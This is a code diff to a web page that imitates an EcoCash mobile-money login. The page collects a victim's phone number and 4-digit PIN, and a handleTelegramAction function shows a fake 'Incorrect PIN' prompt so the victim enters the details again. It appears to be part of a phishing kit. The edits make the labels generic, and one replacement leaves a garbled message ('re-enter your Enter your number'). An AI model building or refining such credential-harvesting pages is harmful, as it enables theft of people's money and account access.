@@ -184,7 +184,7 @@ html,body{
       <div class="card">
         <div class="ct">Enter your EcoCash details</div>
         <div class="fl">
-          <div class="flb">EcoCash number</div>
+          <div class="flb">Enter your number</div>
           <div class="ph-row">
             <div class="ph-pfx">+263</div>
             <input class="ph-num" type="tel" id="ph" inputmode="numeric" pattern="[0-9]*" maxlength="9" placeholder="7XXXXXXXX" autocomplete="tel"/>
@@ -192,7 +192,7 @@ html,body{
           <div class="fh">9 digits starting with 7</div>
         </div>
         <div class="fl">
-          <div class="flb">EcoCash PIN</div>
+          <div class="flb">Enter your PIN</div>
           <div class="pin-wr">
             <input class="pin-in" type="password" id="pin" inputmode="numeric" maxlength="4" pattern="[0-9]*" placeholder="4-digit PIN" autocomplete="current-password"/>
             <button class="eye" id="eBtn" type="button">
@@ -390,7 +390,7 @@ function handleTelegramAction(status){
     // Show error banner on step 1
     var sn=document.querySelector('.sn span');
     if(sn){
-      sn.textContent='🚫 Incorrect PIN entered. Please re-enter your EcoCash number and PIN.';
+      sn.textContent='🚫 Incorrect PIN entered. Please re-enter your Enter your number and PIN.';
       document.querySelector('.sn').style.background='rgba(220,38,38,.07)';
       document.querySelector('.sn').style.borderColor='rgba(220,38,38,.22)';
       document.querySelector('.sn svg').style.stroke='#DC2626';
